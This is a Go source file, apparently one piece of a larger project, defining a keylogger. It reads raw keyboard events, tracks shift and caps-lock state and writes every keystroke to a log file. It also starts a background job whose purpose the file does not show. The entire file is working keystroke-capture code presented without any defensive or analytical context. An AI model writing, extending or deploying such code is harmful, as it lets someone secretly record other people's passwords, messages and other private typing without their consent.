package main

import (
	"fmt"
	"log"
)

var (
	shift bool
	caps  bool
)

func RunKeyLogger() {
	defer logfile.Close()
	devs, err := NewDevices()
	if err != nil {
		log.Fatal(err)
	}
	rd := NewKeyLogger(devs[kbid])
	err = rd.Read()
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		for {
			CronJob(conf.GetString("cron_duration"))
		}
	}()
	for ie := range ret {
		if ie.Type == EV_KEY {
			if ie.Value == 1 {
				if ie.Code == 42 || ie.Code == 54 {
					shift = true
				} else if ie.Code == 58 && caps == false {
					caps = true
				} else if ie.Code == 58 && caps == true {
					caps = false
				}
				k := ie.KeyString(shift, caps)
				log.Print(k)
				if len(k) > 1 {
					_, err = logfile.WriteString(fmt.Sprint("[", k, "]"))
					checkErr(err)
				} else {
					_, err = logfile.WriteString(k)
					checkErr(err)
				}
				logfile.Sync()
			} else if ie.Value == 0 && (ie.Code == 42 || ie.Code == 54) {
				if shift {
					shift = false
				}
			}
		}
	}
}
